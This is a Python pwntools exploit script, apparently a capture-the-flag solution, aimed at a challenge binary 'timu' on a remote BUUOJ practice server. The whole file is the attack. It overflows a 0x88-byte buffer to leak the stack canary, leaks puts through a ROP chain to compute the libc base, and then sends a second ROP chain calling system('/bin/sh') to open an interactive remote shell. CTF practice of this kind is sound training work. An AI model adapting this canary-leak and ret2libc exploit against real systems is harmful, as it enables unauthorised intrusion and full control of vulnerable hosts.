from pwn import *

context.log_level="debug"
#sh=process("./timu")
sh=remote("node5.buuoj.cn",27551)
elf=ELF("./timu")
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc=ELF("./libc-2.23.so")


main=0x0000000000400908
pop_rdi_ret=0x0000000000400a93

sh.sendlineafter(b">> ",b"1")
sh.sendline(0x88*b'a')
sh.sendlineafter(b">> ",b"2")
sh.recvuntil(b'a\n')

canary=u64(sh.recv(7).rjust(8,b"\x00"))
print("canary=",hex(canary))
payload=0x88*b'a'+p64(canary)+0x8*b'a'+p64(pop_rdi_ret)+p64(elf.got["puts"])+p64(elf.plt["puts"])+p64(main)
sh.sendlineafter(b">> ",b"1")
sh.sendline(payload)
sh.sendlineafter(b">>",b"3")
sh.recv()

puts_addr = u64(sh.recv(6).ljust(8,b'\x00'))
print("puts_addr=",hex(puts_addr))
libc_base=puts_addr-libc.sym["puts"]
print("libc_base=",hex(libc_base))
system_addr=libc_base+libc.sym["system"]
binsh=libc_base+next(libc.search(b"/bin/sh"))

payload=0x88*b'a'+p64(canary)+0x8*b'a'+p64(pop_rdi_ret)+p64(binsh)+p64(system_addr)+p64(main)
sh.sendlineafter(b">> ",b"1")
sh.sendline(payload)
sh.sendlineafter(b">> ",b"3")
sh.interactive()
